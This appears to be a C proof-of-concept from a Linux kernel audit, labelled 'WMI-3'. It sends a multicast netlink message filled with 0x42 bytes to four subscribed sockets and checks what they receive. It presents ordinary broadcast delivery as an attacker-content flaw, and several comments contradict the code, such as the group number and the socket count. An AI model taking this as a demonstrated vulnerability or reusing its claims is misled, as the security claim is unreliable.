/*
 * PoC for WMI-3: Attacker-Determined Content in an Authoritative Position
 * @ do_one_broadcast (af_netlink.c:1475)
 *
 * Triggers: netlink_sendmsg -> netlink_broadcast -> do_one_broadcast
 *
 * Demonstrates that attacker-controlled content is delivered through the
 * authoritative netlink_ops.sendmsg path to multicast subscribers.
 *
 * Uses NETLINK_GENERIC and many subscribed sockets to thoroughly exercise
 * the broadcast delivery path.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <linux/netlink.h>
#include <linux/socket.h>
#include <errno.h>

#define NETLINK_GENERIC 16

int main(void)
{
	int fd_recv[8], fd_send;
	struct sockaddr_nl src_addr, dst_addr;
	struct nlmsghdr *nlh;
	char buf[4096];
	int ret, i;
	int nrecv = 4;  /* number of receiver sockets */

	printf("[+] Creating %d receiver sockets on NETLINK_GENERIC\n", nrecv);

	for (i = 0; i < nrecv; i++) {
		fd_recv[i] = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
		if (fd_recv[i] < 0) {
			perror("socket [recv]");
			return 1;
		}

		memset(&src_addr, 0, sizeof(src_addr));
		src_addr.nl_family = AF_NETLINK;
		src_addr.nl_pid    = 20000 + i;  /* unique portid per socket */
		src_addr.nl_groups = 1;           /* subscribe to group 0 */

		ret = bind(fd_recv[i], (struct sockaddr *)&src_addr,
			   sizeof(src_addr));
		if (ret < 0) {
			perror("bind [recv]");
			for (int j = 0; j <= i; j++)
				close(fd_recv[j]);
			return 1;
		}
		printf("[+] Receiver[%d] bound, portid=%u, groups=0x%x\n",
		       i, src_addr.nl_pid, src_addr.nl_groups);
	}

	/* --- Sender socket --- */
	fd_send = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (fd_send < 0) {
		perror("socket [send]");
		for (i = 0; i < nrecv; i++)
			close(fd_recv[i]);
		return 1;
	}

	memset(&dst_addr, 0, sizeof(dst_addr));
	dst_addr.nl_family = AF_NETLINK;
	dst_addr.nl_pid    = 0;
	dst_addr.nl_groups = 1;   /* multicast to group 0 */

	/* Build message: distinctive attacker payload (0x42 = 'B') */
	memset(buf, 0x42, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_len   = NLMSG_HDRLEN + 128;  /* larger payload */
	nlh->nlmsg_type  = NLMSG_NOOP;
	nlh->nlmsg_flags = 0;
	nlh->nlmsg_seq   = 0;
	nlh->nlmsg_pid   = getpid();

	{
		struct iovec  iov = {
			.iov_base = buf,
			.iov_len  = nlh->nlmsg_len,
		};
		struct msghdr msg = {
			.msg_name    = &dst_addr,
			.msg_namelen = sizeof(dst_addr),
			.msg_iov     = &iov,
			.msg_iovlen  = 1,
		};

		ret = sendmsg(fd_send, &msg, 0);
		if (ret < 0 && errno != ECONNREFUSED) {
			/* ECONNREFUSED from unicast to portid=0 is normal */
			perror("sendmsg - unexpected error");
		} else {
			printf("[+] Broadcast sent.  errno=%d (%s)\n",
			       ret < 0 ? errno : 0,
			       ret < 0 ? strerror(errno) : "ok");
		}
	}

	/* --- Receivers: read broadcast --- */
	for (i = 0; i < nrecv; i++) {
		char recv_buf[8192];
		struct iovec iov = {
			.iov_base = recv_buf,
			.iov_len  = sizeof(recv_buf),
		};
		struct sockaddr_nl from;
		struct msghdr msg = {
			.msg_name    = &from,
			.msg_namelen = sizeof(from),
			.msg_iov     = &iov,
			.msg_iovlen  = 1,
		};

		memset(recv_buf, 0, sizeof(recv_buf));
		ret = recvmsg(fd_recv[i], &msg, MSG_DONTWAIT);
		if (ret < 0) {
			printf("[%d] recvmsg: %s\n", i, strerror(errno));
		} else {
			printf("[%d] Received %d bytes from portid=%u\n",
			       i, ret, from.nl_pid);

			/* Check payload content */
			if (ret >= (int)sizeof(struct nlmsghdr)) {
				int plen = ret - sizeof(struct nlmsghdr);
				unsigned char *payload =
					(unsigned char *)recv_buf +
					sizeof(struct nlmsghdr);
				int all_b = 1;
				for (int j = 0; j < plen; j++) {
					if (payload[j] != 0x42) {
						all_b = 0;
						break;
					}
				}
				printf("[%d] Payload verif: %s (all=%s)\n",
				       i,
				       all_b ? "0x42 * N" : "MISMATCH",
				       all_b ? "OK" : "FAIL");
			}
		}
	}

	close(fd_send);
	for (i = 0; i < nrecv; i++)
		close(fd_recv[i]);

	printf("[+] Done.\n");
	return 0;
}
